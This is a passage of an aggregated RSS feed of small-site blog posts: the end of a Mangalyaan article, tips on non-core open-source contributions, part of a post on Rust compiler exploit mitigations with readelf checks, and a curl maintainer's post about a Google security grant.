<p>ISRO plans to launch Mangalyaan 2 in 2024 with an upgraded orbiter, with a capacity of 100 kilograms for scientific instruments. The mission could also include a lander and a rover but it seems unlikely at the moment. Notably, Mangalyaan 2 will launch after the first Mars rover missions from China and the European Space Agency, and alongside NASA‚Äôs ever present Mars fleet. Let us hope Mangalyaan 2 is an appropriate step forward in this journey.</p>



<div><figure><img loading="lazy" width="1200" height="1200" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1200%2C1200&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?w=2048&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=200%2C200&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1200%2C1200&amp;ssl=1 1200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=800%2C800&amp;ssl=1 800w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=400%2C400&amp;ssl=1 400w" sizes="(max-width: 1200px) 100vw, 1200px" data-recalc-dims="1"><figcaption>Global view of Mars from the Mangalyaan spacecraft, taken on October 4, 2014, from an altitude of 76,680 kilometers.<em>&nbsp;</em>Credit: ISRO / Emily Lakdawalla, released under <a href="https://creativecommons.org/licenses/by-nc-nd/3.0/">CC BY-NC-ND 3.0</a>.</figcaption></figure></div>



<blockquote><p>I could write this article because of the support of my readers on <a href="https://www.patreon.com/uncertainquark">Patreon</a>. I don‚Äôt display ads on my blog so if you like my work, consider&nbsp;<a href="https://www.patreon.com/uncertainquark">supporting me</a> and get benefits in return.&nbsp;üöÄ</p></blockquote>



<hr>



<p><em><a href="https://science.thewire.in/space/isros-mangalyaan-orbiter-completes-six-years-around-mars-wheres-the-science/">Republished</a> by The Wire Science.</em></p>



<pre>On a related note, I was invited as a guest on the NewSpace India podcast led by <a href="https://twitter.com/cosmosguru/">Narayan Prasad</a>, a space entrepreneur and industry expert, to <a href="https://share.transistor.fm/s/b5cea33e">talk about Mangalyaan and India's space exploration missions</a>.</pre>

</div></div>]]>
            </description>
            <link>https://jatan.space/missing-science-from-mangalyaan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576962</guid>
            <pubDate>Thu, 24 Sep 2020 09:50:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Uncommon Contributions: Making impact without touching the core of a library]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24575934">thread link</a>) | @dsr12
<br/>
September 23, 2020 | https://koaning.io/posts/cool-commits/ | <a href="https://web.archive.org/web/*/https://koaning.io/posts/cool-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>There are a lot of ways that you can contribute to open source. Frequent contributions include adding features to a library, fixing bugs, or providing examples to a documentation page. All of these contributions are valid, but there are other avenues that you may want to consider too. In this blog post, I‚Äôd like to list a few <em>non-standard</em> examples that might inspire.</p>
<p>I‚Äôll also add some images to highlight why some of these changes matter.</p>
<h2 id="info">Info</h2>
<p><img src="https://koaning.io/posts/cool-commits/info.png"></p>
<p>My first proper PR for <a href="https://github.com/rasaHQ/rasa">Rasa</a> has little to do with the core library. It doesn‚Äôt help in making a chatbot at all. Instead, I upgraded this command:</p>
<pre><code>
rasa --version</code></pre>
<p>Before, this command would list the current version of Rasa. In the new version, it lists:</p>
<ol type="1">
<li>The version of python.</li>
<li>The path to your virtual environment.</li>
<li>The versions of related packages.</li>
</ol>
<p>This is a pretty big feature if you consider the amount of work that goes into submitting a proper bug report. By adding this feature, it is much easier to supply all the relevant information. Just copy and paste the output of this call, and you‚Äôll be writing a much better bug report. No need to fiddle around with commands like:</p>
<pre><code>
pip freeze | grep package-name</code></pre>
<p>This feature has little to do with the core package code but still makes a lot of impact. The debugging process is made easier for both the user and the maintainers of the project.</p>
<h2 id="cron-on-dependencies">Cron on Dependencies</h2>
<p><img src="https://koaning.io/posts/cool-commits/cron.png"></p>
<p>A user for <a href="https://scikit-lego.readthedocs.io/en/latest/">scikit-lego</a>, a package that I maintain, discovered that the reason the code wasn‚Äôt working was because scikit-learn introduced a minor, but breaking, change. To fix this the user added <a href="https://github.com/koaning/scikit-lego/pull/378">a cronjob with Github actions</a> to the project.</p>
<p>Before the PR, we had to hear from users when a dependency introduced breaking changes. By adding a cronjob that would run our unit tests daily, the user removed a blind spot from the project. Every day we now run the unit tests using the latest versions of our dependencies. If the tests break, we can quickly pinpoint what package caused it and create a fix. You can imagine how this might lead to fewer issues for our users.</p>
<p>This feature, again, had little to do with the core package code.</p>
<h2 id="spellcheck">Spellcheck</h2>
<p><img src="https://koaning.io/posts/cool-commits/spelling.png"></p>
<p>For the <a href="https://scikit-lego.readthedocs.io/en/latest/">scikit-lego project</a>, we met a user who was interested in contributing but didn‚Äôt know where to start. The user hadn‚Äôt made many contributions yet and was looking for something easy. His main goal was to get more comfortable with git and to get going with a first open-source contribution. I mentioned that addressing spelling errors is certainly valid, so the user went ahead with this.</p>
<p>The results were somewhat <a href="https://github.com/koaning/scikit-lego/pull/341">epic</a>. He ran a spellchecker, not just against our docs, but also on our source code! It turns out we had some issues in our docstrings as well. While exploring this theme we‚Äôve also discovered flake8 compatible packages that do spellchecking on <a href="https://github.com/MichaelAquilina/flake8-spellcheck">variable names</a>.</p>
<p>Spell-checking was something we hadn‚Äôt considered, and it was a much-appreciated code quality update.</p>
<h2 id="error-messages">Error Messages</h2>
<p><img src="https://koaning.io/posts/cool-commits/error.png"></p>
<p>One of the harder parts of writing a package for other people is getting people to understand how they should use the package. As a maintainer, you cannot imagine what it is like not to understand your own code. New users, on the other hand, can spot this instantly.</p>
<p>This is why a popular entry point for contribution is documentation. Documentation is often read when something goes wrong after the user sees a confusing error, so it makes sense for new users to contribute there. But you can go a step further! Instead of changing the docs, why not write a more meaningful error message?</p>
<p>In <a href="https://github.com/RasaHQ/whatlies/pull/141">whatlies</a>, we‚Äôve recently allowed for optional dependencies. If you try to use a part of the library that requires a dependency that is not part of the base package, then you‚Äôll get this error message.</p>
<pre><code>
In order to use ConveRTLanguage you'll need to install via;

&gt; pip install whatlies[tfhub]

See installation guide here: https://rasahq.github.io/whatlies/#installation</code></pre>
<p>This feature has little to do with the core functionality of the library. Yet, it will do a lot for developer experience.</p>
<h2 id="failing-unit-tests">Failing Unit Tests</h2>
<p><img src="https://koaning.io/posts/cool-commits/test.png"></p>
<p>There‚Äôs a lovely plugin for <a href="https://www.mkdocs.org/">mkdocs</a> called <a href="https://github.com/danielfrg/mkdocs-jupyter">mkdocs-jupyter</a>. It allows you to easily add jupyter notebooks to your documentation pages. When I was playing with it, I noticed that it wasn‚Äôt compatible with a new version of <code>mkdocs</code>. Instead of just submitting a bug to Github, I went the extra mile. I created a PR that contained a failing unit-test for this issue. This was great for the maintainer because it was easier to understand the issue and to fix it.</p>
<p>This feature, again, had little to do with the core package code.</p>

<p><img src="https://koaning.io/posts/cool-commits/rename.png"></p>
<p>Let‚Äôs compare two pieces of code from a library that I maintain.</p>
<h4 id="exibit-a">Exibit A</h4>
<pre><code>
from whatlies.transformer import Pca
pca_plot = emb.transform(Pca(2)).plot_interactive()</code></pre>
<h4 id="exibit-b">Exibit B</h4>
<pre><code>
from whatlies.transformer import pca
pca_plot = emb.transform(pca(2)).plot_interactive()</code></pre>
<h3 id="the-difference">The Difference</h3>
<p>Did you see the difference? In the first example we‚Äôre importing <code>Pca</code> and in the second example <code>pca</code>. The difference is an upper case/lower case letter and this small typo caused a <a href="https://github.com/RasaHQ/whatlies/issues/194">very unintuitive bug</a>.</p>
<p>The bug is related to the file structure of the project.</p>
<pre><code>
whatlies
‚îú‚îÄ‚îÄ __init__.py
‚îú‚îÄ‚îÄ embedding.py
‚îú‚îÄ‚îÄ embeddingset.py
‚îú‚îÄ‚îÄ language
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ __init__.py
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ transformers
    ‚îú‚îÄ‚îÄ __init__.py
    ‚îú‚îÄ‚îÄ pca.py
    ‚îî‚îÄ‚îÄ ...</code></pre>
<p>The <code>Pca</code> class is defined in the <code>pca.py</code> file in the <code>transformers</code> folder. We intended to expose the <code>Pca</code> class via the <code>__init__.py</code> file in the same folder. Unfortunately, by importing <code>pca</code> instead of <code>Pca</code> you‚Äôre getting the submodule instead of the intended class.</p>
<p>A single character could cause a really confusing bug so we had to fix it. So we fixed it by changing the filename from <code>pca.py</code> to <code>_pca.py</code>.</p>
<pre><code>
whatlies
‚îú‚îÄ‚îÄ __init__.py
‚îú‚îÄ‚îÄ embedding.py
‚îú‚îÄ‚îÄ embeddingset.py
‚îú‚îÄ‚îÄ language
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ __init__.py
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ transformers
    ‚îú‚îÄ‚îÄ __init__.py
    ‚îú‚îÄ‚îÄ _pca.py
    ‚îî‚îÄ‚îÄ ...</code></pre>
<p>We didn‚Äôt just do this for <code>_pca.py</code> but for <a href="https://github.com/RasaHQ/whatlies/pull/195/files?file-filters%5B%5D=.py">all files where this error might occur</a>.</p>
<p>Again, this change doesn‚Äôt require you to understand the core code of the library.</p>

<p>Many of the coolest contributions might have nothing to do with the core library. All of the examples that I‚Äôve listed above have been tremendous features for some of the package that I maintain but also for some of the larger code repositories out there. Feel free to remember this when you‚Äôre considering your first contribution.</p>
<!--radix_placeholder_article_footer-->
<p>
    <span>
      Share: &nbsp;
      <a href="https://twitter.com/share?text=Uncommon%20Contributions&amp;url=https%3A%2F%2Fkoaning.io%2Fposts%2Fcool-commits%2F">
        <i></i>
      </a>
      <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fkoaning.io%2Fposts%2Fcool-commits%2F&amp;title=Uncommon%20Contributions">
        <i></i>
      </a>
    </span>
  </p>
<!--/radix_placeholder_article_footer-->
</div></div>]]>
            </description>
            <link>https://koaning.io/posts/cool-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575934</guid>
            <pubDate>Thu, 24 Sep 2020 06:38:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust programming language exploit mitigations]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24575844">thread link</a>) | @DyslexicAtheist
<br/>
September 23, 2020 | https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/ | <a href="https://web.archive.org/web/*/https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>By  on <time itemprop="datePublished" datetime="2020-09-16T00:00:00-07:00">September 16, 2020</time>. <a href="https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/#disqus_thread" data-disqus-identifier="/2020/09/16/rust-lang-exploit-mitigations/"></a></p><div itemprop="articleBody">
    <p>The Rust programming language provides memory[1] and thread[2] safety
guarantees via its ownership[3], references and borrowing[4], and slice
types[5] features. However, Unsafe Rust[6] introduces unsafe blocks, unsafe
functions and methods, unsafe traits, and new types that are not subject to
the borrowing rules.</p>

<p>Parts of the Rust standard library are implemented as safe abstractions over
unsafe code (and historically have been vulnerable to memory corruption[7]).
Furthermore, the Rust code and documentation encourage creating safe
abstractions over unsafe code. This can cause a false sense of security if
unsafe code is not properly reviewed and tested.</p>

<p>Unsafe Rust disables some of the features that provide memory and thread
safety guarantees. This causes programs or libraries to be susceptible to
memory corruption (CWE-119)[8] and concurrency issues (CWE-557)[9]. Modern C
and C++ compilers provide exploit mitigations to increase the difficulty to
exploit vulnerabilities resulting from these issues. Therefore, the Rust
compiler must also support these exploit mitigations in order to mitigate
vulnerabilities resulting from the use of Unsafe Rust. This post is going to
document these exploit mitigations and how they apply to Rust.</p>

<h2 id="exploit-mitigations">Exploit mitigations</h2>

<p>This section documents the exploit mitigations applicable to the Rust
compiler when building programs for the Linux operating system on the AMD64
architecture and equivalent.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> All examples in this section were
built using the Rust compiler version 1.40.0 (2019-12-19) on Debian testing
(Bullseye).</p>

<p>The Rust Programming Language currently has no specification. The Rust
compiler (i.e., rustc) is the language reference implementation. All
references to ‚Äúthe Rust compiler‚Äù in this post refer to the language
reference implementation.</p>

<p>Table I <br>
Summary of exploit mitigations supported by the Rust compiler when building
programs for the Linux operating system on the AMD64 architecture and
equivalent.</p>
<table>
  <tbody><tr>
   <td><strong>Exploit mitigation</strong>
   </td>
   <td><strong>Supported and enabled by default</strong>
   </td>
   <td><strong>Since</strong>
   </td>
  </tr>
  <tr>
   <td>Position-independent executable
   </td>
   <td>Yes
   </td>
   <td>0.12.0 (2014-10-09)
   </td>
  </tr>
  <tr>
   <td>Integer overflow checks
   </td>
   <td>Supported but enabled by default when debug assertions are enabled only.
   </td>
   <td>1.1.0 (2015-06-25)
   </td>
  </tr>
  <tr>
   <td>Non-executable memory regions
   </td>
   <td>Yes
   </td>
   <td>1.8.0 (2016-04-14)
   </td>
  </tr>
  <tr>
   <td>Stack clashing protection
   </td>
   <td>Yes
   </td>
   <td>1.20.0 (2017-08-31)
   </td>
  </tr>
  <tr>
   <td>Read-only relocations and immediate binding
   </td>
   <td>Yes
   </td>
   <td>1.21.0 (2017-10-12)
   </td>
  </tr>
  <tr>
   <td>Heap corruption protection
   </td>
   <td>Yes
   </td>
   <td>1.32.0 (2019-01-17) via OS default or specified allocator
   </td>
  </tr>
  <tr>
   <td>Stack smashing protection
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Forward-edge control flow protection
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Backward-edge control flow protection (e.g., shadow and safe stack)
   </td>
   <td>No
   </td>
   <td>
   </td>
  </tr>
</tbody></table>

<p id="fn:1">1. See
<a href="https://github.com/rust-lang/rust/tree/master/compiler/rustc_target/src/spec">https://github.com/rust-lang/rust/tree/master/compiler/rustc_target/src/spec</a>
for a list of targets and their default options. <a href="#fnref:1" role="doc-backlink">‚Ü©</a></p>

<h3 id="position-independent-executable">Position-independent executable</h3>

<p>Position-independent executable increases the difficulty of the use of code
reuse exploitation techniques, such as return-oriented programming (ROP) and
variants, by generating position-independent code for the executable, and
instructing the dynamic linker to load it similarly to a shared object at a
random load address, thus also benefiting from address-space layout
randomization (ASLR). This is also referred to as ‚Äúfull ASLR‚Äù.</p>

<p>The Rust compiler supports position-independent executable and enables it by
default since version 0.12.0 (2014-10-09)[10]‚Äì[13].</p>

<div><div><pre><code>$ readelf -h target/release/hello-rust | grep Type:
  Type:                              DYN (Shared object file)
</code></pre></div></div>
<p>Fig. 1.‚ÄÉChecking if an executable is a position-independent executable.</p>

<p>An executable with an object type of <code>ET_DYN</code> (i.e., shared object) and not
<code>ET_EXEC</code> (i.e., executable) is a position-independent executable (see Fig.
1).</p>

<h3 id="integer-overflow-checks">Integer overflow checks</h3>

<p>Integer overflow checks protects programs from undefined and unintended
behavior (which may cause vulnerabilities) by checking for results of signed
and unsigned integer computations that cannot be represented in their type,
resulting in an overflow or wraparound.</p>

<p>The Rust compiler supports integer overflow checks, and enables it when
debug assertions are enabled since version 1.0.0 (2015-05-15)[14]‚Äì[17], but
support for it was not completed until version 1.1.0 (2015-06-25)[16]. An
option to control integer overflow checks was later stabilized in version
1.17.0 (2017-04-27)[18]‚Äì[20].</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>u</span><span>:</span> <span>u8</span> <span>=</span> <span>255</span><span>;</span>
    <span>println!</span><span>(</span><span>"u: {}"</span><span>,</span> <span>u</span> <span>+</span> <span>1</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<p>Fig. 2.‚ÄÉhello-rust-integer program.</p>

<div><div><pre><code>$ cargo run
   Compiling hello-rust-integer v0.1.0 (/home/rcvalle/hello-rust-integer)
    Finished dev [unoptimized + debuginfo] target(s) in 0.23s
     Running `target/debug/hello-rust-integer`
thread 'main' panicked at 'attempt to add with overflow', src/main.rs:3:23
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.
</code></pre></div></div>
<p>Fig. 3.‚ÄÉBuild and execution of hello-rust-integer with debug assertions
enabled.</p>

<div><div><pre><code>$ cargo run --release
   Compiling hello-rust-integer v0.1.0 (/home/rcvalle/hello-rust-integer)
    Finished release [optimized] target(s) in 0.23s
     Running `target/release/hello-rust-integer`
u: 0
</code></pre></div></div>
<p>Fig. 4.‚ÄÉBuild and execution of hello-rust-integer with debug assertions
disabled.</p>

<p>Integer overflow checks are enabled when debug assertions are enabled (see
Fig. 3), and disabled when debug assertions are disabled (see Fig. 4). To
enable integer overflow checks independently, use the option to control
integer overflow checks, scoped attributes, or explicit checking methods
such as <code>checked_add</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p>It is recommended that explicit wrapping methods such as <code>wrapping_add</code> be
used when wrapping semantics are intended, and that explicit checking and
wrapping methods always be used when using Unsafe Rust.</p>

<p id="fn:2">2. See <a href="https://doc.rust-lang.org/std/primitive.u32.html">https://doc.rust-lang.org/std/primitive.u32.html</a> for more
information on the checked, overflowing, saturating, and wrapping methods
(using u32 as an example). <a href="#fnref:2" role="doc-backlink">‚Ü©</a></p>

<h3 id="non-executable-memory-regions">Non-executable memory regions</h3>

<p>Non-executable memory regions increase the difficulty of exploitation by
limiting the memory regions that can be used to execute arbitrary code. Most
modern processors provide support for the operating system to mark memory
regions as non executable, but it was previously emulated by software, such
as in grsecurity/PaX
<a href="https://pax.grsecurity.net/docs/pageexec.txt">PAGEEXEC</a> and
<a href="https://pax.grsecurity.net/docs/segmexec.txt">SEGMEXEC</a>, on processors that
did not provide support for it. This is also known as ‚ÄúNo Execute (NX) Bit‚Äù,
‚ÄúExecute Disable (XD) Bit‚Äù, ‚ÄúExecute Never (XN) Bit‚Äù, and others.</p>

<p>The Rust compiler supports non-executable memory regions, and enables it by
default since its initial release, version 0.1 (2012-01-20)[21], [22], but
has regressed since then[23]‚Äì[25], and enforced by default since version
1.8.0 (2016-04-14)[25].</p>

<div><div><pre><code>$ readelf -l target/release/hello-rust | grep -A 1 GNU_STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
</code></pre></div></div>
<p>Fig. 5.‚ÄÉChecking if non-executable memory regions are enabled for a given
binary.</p>

<p>The presence of an element of type <code>PT_GNU_STACK</code> in the program header
table with the <code>PF_X</code> (i.e., executable) flag unset indicates non-executable
memory regions<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> are enabled for a given binary (see Fig. 5).
Conversely, the presence of an element of type <code>PT_GNU_STACK</code> in the program
header table with the <code>PF_X</code> flag set or the absence of an element of type
<code>PT_GNU_STACK</code> in the program header table indicates non-executable memory
regions are not enabled for a given binary.</p>

<p id="fn:3">3. See the Appendix section for more information on why it affects other
memory regions besides the stack. <a href="#fnref:3" role="doc-backlink">‚Ü©</a></p>

<h3 id="stack-clashing-protection">Stack clashing protection</h3>

<p>Stack clashing protection protects the stack from overlapping with another
memory region‚Äîallowing arbitrary data in both to be overwritten using each
other‚Äîby reading from the stack pages as the stack grows to cause a page
fault when attempting to read from the guard page/region. This is also
referred to as ‚Äústack probes‚Äù or ‚Äústack probing‚Äù.</p>

<p>The Rust compiler supports stack clashing protection via stack probing, and
enables it by default since version 1.20.0 (2017-08-31)[26]‚Äì[29].</p>

<p><img src="https://rcvalle.blog/assets/2020/09/16/rust-lang-exploit-mitigations/image1.png" alt="Screenshot listing cross references to __rust_probestack in hello-rust." title="Cross references to __rust_probestack in hello-rust.">
Fig. 6. Cross references to <code>__rust_probestack</code> in hello-rust.</p>

<div><div><pre><code><span>fn</span> <span>hello</span><span>()</span> <span>{</span>
    <span>println!</span><span>(</span><span>"Hello, world!"</span><span>);</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>_</span><span>:</span> <span>[</span><span>u64</span><span>;</span> <span>1024</span><span>]</span> <span>=</span> <span>[</span><span>0</span><span>;</span> <span>1024</span><span>];</span>
    <span>hello</span><span>();</span>
<span>}</span>
</code></pre></div></div>
<p>Fig 7. Modified hello-rust.</p>

<p><img src="https://rcvalle.blog/assets/2020/09/16/rust-lang-exploit-mitigations/image2.png" alt="Screenshot listing cross references to __rust_probestack in modified hello-rust." title="Cross references to __rust_probestack in modified hello-rust.">
Fig. 8. Cross references to <code>__rust_probestack</code> in modified hello-rust.</p>

<p>To check if stack clashing protection is enabled for a given binary, search
for cross references to <code>__rust_probestack</code>. The <code>__rust_probestack</code> is
called in the prologue of functions whose stack size is larger than a page
size (see Fig. 6), and can be forced for illustration purposes by modifying
the hello-rust example as seen in Fig. 7 and Fig. 8.</p>

<h3 id="read-only-relocations-and-immediate-binding">Read-only relocations and immediate binding</h3>

<p><strong>Read-only relocations</strong> protect segments containing relocations and
relocation information (i.e., <code>.init_array</code>, <code>.fini_array</code>, <code>.dynamic</code>, and
<code>.got</code>) from being overwritten by marking these segments read only. This is
also referred to as ‚Äúpartial RELRO‚Äù.</p>

<p>The Rust compiler supports read-only relocations, and enables it by default
since version 1.21.0 (2017-10-12)[30], [31].</p>

<div><div><pre><code>$ readelf -l target/release/hello-rust | grep GNU_RELRO
  GNU_RELRO      0x000000000002ee00 0x000000000002fe00 0x000000000002fe00
</code></pre></div></div>
<p>Fig. 9.‚ÄÉChecking if read-only relocations is enabled for a given binary.</p>

<p>The presence of an element of type <code>PT_GNU_RELRO</code> in the program header
table indicates read-only relocations are enabled for a given binary (see
Fig. 9). Conversely, the absence of an element of type <code>PT_GNU_RELRO</code> in the
program header table indicates read-only relocations are not enabled for a
given binary.</p>

<p><strong>Immediate binding</strong> protects additional segments containing relocations
(i.e., <code>.got.plt</code>) from being overwritten by instructing the dynamic linker
to perform all relocations before transferring control to the program during
startup so all segments containing relocations can be marked read only (when
combined with read-only ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/">https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/</a></em></p>]]>
            </description>
            <link>https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575844</guid>
            <pubDate>Thu, 24 Sep 2020 06:25:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Google Grant for Libcurl Work]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24575819">thread link</a>) | @gilad
<br/>
September 23, 2020 | https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this year I was the recipient of a monetary <a rel="noreferrer noopener" href="https://www.google.com/about/appsecurity/patch-rewards/" target="_blank">Google patch grant</a> with the expressed purpose of <strong>improving security in libcurl</strong>.</p>



<p>This was an upfront payout under this Google program describing itself as ‚Äúan experimental program that rewards proactive security improvements to select open-source projects‚Äù.</p>



<p>I accepted this grant for the curl project and <strong>I intend to keep working fiercely on securing curl</strong>. I recognize the importance of curl security as curl remains one of the most widely used software components in the world, and even one that is doing network data transfers which typically is a risky business. curl is responsible for a <a href="https://daniel.haxx.se/blog/2019/12/04/daily-web-traffic/">measurable share</a> of all Internet transfers done over the Internet an average day. My job is to make sure those transfers are done as safe and secure as possible. It isn‚Äôt my <em>only</em> responsibility of course, as I have other tasks to attend to as well, but still.</p>



<h2>Do more</h2>



<p>Security is already and always a top priority in the curl project and for myself personally. This grant will of course further my efforts to strengthen curl and by association, all the many users of it.</p>



<h2>What I will not do</h2>



<p>When security comes up in relation to curl, some people like to mention and propagate for other programming languages, But <strong>curl will not be rewritten in another language</strong>. Instead we will increase our efforts in writing good C and detecting problems in our code earlier and better.</p>



<h2>Proactive counter-measures</h2>



<p>Things we have done lately and working on to enforce everywhere:</p>



<p><strong>String and buffer size limits</strong> ‚Äì all string inputs and all buffers in libcurl that are allowed to grow now have a maximum allowed size, that makes sense. This stops malicious uses that could make things grow out of control and it helps detecting programming mistakes that would lead to the same problems. Also, by making sure strings and buffers are never ridiculously large, we avoid a whole class of integer overflow risks better.</p>



<p><strong>Unified dynamic buffer functions</strong> ‚Äì by reducing the number of different implementations that handle ‚Äúgrowing buffers‚Äù we reduce the risk of a bug in one of them, even if it is used rarely or the spot is hard to reach with and ‚Äúexercise‚Äù by the fuzzers. The ‚Äúdynbuf‚Äù internal API first shipped in curl 7.71.0 (June 2020).</p>



<p><strong>Realloc buffer growth unification</strong> ‚Äì pretty much the same point as the previous, but we have earlier in our history had several issues when we had silly realloc() treatment that could lead to bad things. By limiting string sizes and unifying the buffer functions, we have reduced the number of places we use realloc and thus we reduce the number of places risking new realloc mistakes. The realloc mistakes were usually in combination with integer overflows.</p>



<p><strong>Code style</strong> ‚Äì we‚Äôve gradually improved our code style checker (<code>checksrc.pl</code>) over time and we‚Äôve also gradually made our code style more strict, leading to less variations in code, in white spacing and in naming. I‚Äôm a firm believer this makes the code look more coherent and therefore become more readable which leads to fewer bugs and easier to debug code. It also makes it easier to grep and search for code as you have fewer variations to scan for.</p>



<p><strong>More code analyzers</strong> ‚Äì we run every commit and PR through a large number of code analyzers to help us catch mistakes early, and we always remove detected problems. Analyzers used at the time of this writing: lgtm.com, Codacy, Deepcode AI, Monocle AI, clang tidy, scan-build, CodeQL, Muse and Coverity. That‚Äôs of course in addition to the regular run-time tools such as valgrind and sanitizer builds that run the entire test suite.</p>



<p><strong>Memory-safe components</strong> ‚Äì curl already supports getting built with a plethora of different libraries and ‚Äúbackends‚Äù to cater for users‚Äô needs and desires. By properly supporting and offering users to build with components that are written in for example rust ‚Äì or other languages that help developers avoid pitfalls ‚Äì future curl and libcurl builds could potentially avoid a whole section of risks. (Stay tuned for more on this topic in a near future.)</p>



<h2>Reactive measures</h2>



<p>Recognizing that whatever we do and however tight ship we run, <strong>we will continue to slip every once in a while</strong>, is important and we should make sure we find and fix such slip-ups as good and early as possible.</p>



<p><strong>Raising bounty rewards</strong>. While not directly fixing things, offering more money in <a href="https://hackerone.com/curl">our bug-bounty program</a> helps us get more attention from security researchers. Our ambition is to gently drive up the reward amounts progressively to perhaps multi-thousand dollars per flaw, as long as we have funds to pay for them and we mange keep the security vulnerabilities at a reasonably low frequency.</p>



<p><strong>More fuzzing</strong>. I‚Äôve said it before but let me say it again: fuzzing is really the top method to find problems in curl once we‚Äôve fixed all flaws that the static analyzers we use have pointed out.  The primary fuzzing for curl is done by OSS-Fuzz, that tirelessly keeps hammering on the most recent curl code.</p>



<p>Good fuzzing needs a certain degree of ‚Äúhand-holding‚Äù to allow it to really test all the APIs and dig into the dustiest corners, and we should work on adding more ‚Äúprobes‚Äù and entry-points into libcurl for the fuzzer to make it exercise more code paths to potentially detect more mistakes.</p>



<p>See also my presentation <a href="https://daniel.haxx.se/blog/2020/07/02/video-testing-curl-for-security/">testing curl for security</a>.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575819</guid>
            <pubDate>Thu, 24 Sep 2020 06:20:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How much I made as a data scientist]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574928">thread link</a>) | @data4lyfe
<br/>
September 23, 2020 | https://www.interviewquery.com/blog-data-science-salaries/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-data-science-salaries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.interviewquery.com/content/images/size/w300/2020/09/software-developer-3182374_1280.jpg 300w,
                            https://www.interviewquery.com/content/images/size/w600/2020/09/software-developer-3182374_1280.jpg 600w,
                            https://www.interviewquery.com/content/images/size/w1000/2020/09/software-developer-3182374_1280.jpg 1000w,
                            https://www.interviewquery.com/content/images/size/w2000/2020/09/software-developer-3182374_1280.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.interviewquery.com/content/images/size/w2000/2020/09/software-developer-3182374_1280.jpg" alt="How Much Do Data Scientists Make? (My Journey)">
            </figure>

            <section>
                <div>
